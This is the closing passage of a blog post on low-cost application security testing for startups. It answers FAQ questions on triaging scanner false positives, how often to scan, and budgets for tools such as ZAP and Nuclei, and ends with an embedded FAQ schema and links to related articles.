Triage each finding manually the first time. For ZAP, create a rules.tsv file that marks confirmed false positives so they are suppressed in future scans. For Nuclei, false positives are rare by design, but you can exclude specific templates. Track your false positive rate over time. If a specific rule consistently fires incorrectly for your stack, suppress it and document why. Never suppress a finding you have not investigated.

**What is the minimum security testing budget for a startup?**
Zero dollars for tooling. ZAP, Nuclei, sqlmap, ffuf, and Schemathesis are all free and open source. Burp Suite Community Edition is free. Your security-focused tests run in your existing CI pipeline. The real cost is developer time: approximately two to four hours for Phase 1, one to two days for Phase 2, and one to two weeks for Phase 3. When you are ready for professional testing, budget $5,000 to $15,000 for a focused web application assessment.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "Can free security tools really replace professional penetration testing?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Free tools cover the majority of known vulnerability classes: injection flaws, XSS, misconfigurations, missing security headers, and known CVEs. What they cannot do is test business logic, chain multiple low-severity findings into a critical exploit, or think creatively like a human adversary. Use free tools as your baseline and bring in professionals when you handle sensitive data, need compliance evidence, or have complex authorization logic."
      }
    },
    {
      "@type": "Question",
      "name": "How often should I run security scans?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Run ZAP baseline scans on every push to your main branch. Run ZAP full scans weekly against staging. Run Nuclei weekly or after template updates. Run your security-focused tests on every CI build. The goal is continuous coverage, not periodic audits."
      }
    },
    {
      "@type": "Question",
      "name": "Which tool should I start with: ZAP or Nuclei?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Start with ZAP. It crawls your application, discovers endpoints you might have forgotten about, and tests them for common vulnerability classes. Then add Nuclei for fast known-CVE detection and misconfiguration checks. ZAP gives breadth through application crawling. Nuclei gives depth on known issues with near-zero false positives."
      }
    },
    {
      "@type": "Question",
      "name": "Is Burp Suite Community Edition worth using if ZAP is free?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Yes, for manual testing. ZAP is stronger for automated scanning and CI integration. Burp Community is better for interactive manual testing: intercepting requests, modifying parameters, analyzing session tokens, and exploring specific application behaviors one request at a time. Use ZAP for automation and Burp Community for manual exploration."
      }
    },
    {
      "@type": "Question",
      "name": "How do I handle false positives from security scanners?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Triage each finding manually the first time. For ZAP, create a rules.tsv file that marks confirmed false positives so they are suppressed in future scans. For Nuclei, false positives are rare by design, but you can exclude specific templates. Track your false positive rate over time and suppress findings you have confirmed as incorrect, documenting why."
      }
    },
    {
      "@type": "Question",
      "name": "What is the minimum security testing budget for a startup?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Zero dollars for tooling. ZAP, Nuclei, sqlmap, ffuf, and Schemathesis are all free and open source. Burp Suite Community Edition is free. The real cost is developer time: approximately two to four hours for initial setup, one to two days for automated test writing, and one to two weeks for comprehensive coverage. When ready for professional testing, budget $5,000 to $15,000 for a focused web application assessment."
      }
    }
  ]
}
</script>

---

**Keep reading:**
- [Security-First Development: A Practical Guide](/blog/security-first-development-guide/)
- [OWASP Top 10 in Practice: Code Examples and Free Tools](/blog/owasp-top-10-practice/)
- [The Free Security Toolstack: Every Tool You Need for $0](/blog/free-security-toolstack/)

*Ready to set up security testing for your application? [Let's talk](https://calendly.com/juanidrovo).*
